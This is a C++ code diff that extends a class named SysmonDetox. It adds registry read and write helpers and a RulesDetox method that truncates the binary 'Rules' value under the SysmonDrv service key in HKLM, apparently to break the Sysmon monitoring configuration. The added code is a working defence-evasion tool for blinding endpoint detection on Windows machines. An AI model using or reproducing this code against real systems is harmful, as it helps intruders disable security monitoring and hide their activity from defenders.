@@ -22,6 +22,56 @@ using namespace std;
 class SysmonDetox
 {
 private:
+    // Function to read the binary value from the registry
+    bool ReadRegistryBinaryValue(HKEY hKey, LPCSTR subKey, LPCSTR valueName, vector<BYTE>& buffer) {
+        HKEY key;
+        // Open the registry key for reading
+        if (RegOpenKeyExA(hKey, subKey, 0, KEY_QUERY_VALUE, &key) != ERROR_SUCCESS) {
+            std::cerr << "Error opening registry key." << std::endl;
+            return false;
+        }
+
+        DWORD dataSize = 0;
+        // Get the size of the registry value
+        if (RegQueryValueExA(key, valueName, NULL, NULL, NULL, &dataSize) != ERROR_SUCCESS) {
+            std::cerr << "Error querying registry value size." << std::endl;
+            RegCloseKey(key);
+            return false;
+        }
+
+        // Resize the buffer to hold the registry value
+        buffer.resize(dataSize);
+        // Read the registry value into the buffer
+        if (RegQueryValueExA(key, valueName, NULL, NULL, buffer.data(), &dataSize) != ERROR_SUCCESS) {
+            std::cerr << "Error querying registry value." << std::endl;
+            RegCloseKey(key);
+            return false;
+        }
+
+        RegCloseKey(key);
+        return true;
+    }
+
+    // Function to write the modified binary value back to the registry
+    bool WriteRegistryBinaryValue(HKEY hKey, LPCSTR subKey, LPCSTR valueName, const vector<BYTE>& buffer) {
+        HKEY key;
+        // Open the registry key for writing
+        if (RegOpenKeyExA(hKey, subKey, 0, KEY_SET_VALUE, &key) != ERROR_SUCCESS) {
+            std::cerr << "Error opening registry key for writing." << std::endl;
+            return false;
+        }
+
+        // Set the new value in the registry
+        if (RegSetValueExA(key, valueName, 0, REG_BINARY, buffer.data(), buffer.size()) != ERROR_SUCCESS) {
+            std::cerr << "Error setting registry value." << std::endl;
+            RegCloseKey(key);
+            return false;
+        }
+
+        RegCloseKey(key);
+        return true;
+    }
+
     std::string binaryToAscii(const std::vector<BYTE>& binaryData) {
         std::string asciiString;
         for (BYTE byte : binaryData) {
@@ -412,4 +462,31 @@ public:
         return 0;
     }
 
+	// Admin privileges required
+    // Function to modify the registry binary value by truncating it up to the first 0x30 byte (which represents '0' in ASCII)
+    int RulesDetox() {
+        HKEY hKey = HKEY_LOCAL_MACHINE;
+        LPCSTR subKey = "SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters";
+        LPCSTR valueName = "Rules";
+
+        vector<BYTE> buffer;
+        // Read the existing binary value from the registry
+        if (!ReadRegistryBinaryValue(hKey, subKey, valueName, buffer)) {
+            return 1;
+        }
+
+        // Find the first occurrence of 0x30 (ASCII '0') and truncate the buffer after it
+        auto pos = find(buffer.begin(), buffer.end(), 0x30);
+        if (pos != buffer.end()) {
+            buffer.erase(pos + 1, buffer.end());
+        }
+
+        // Write the modified value back to the registry
+        if (!WriteRegistryBinaryValue(hKey, subKey, valueName, buffer)) {
+            return 1;
+        }
+
+        std::cout << "Successfully modified the binary value in the registry." << std::endl;
+        return 0;
+    }
 };
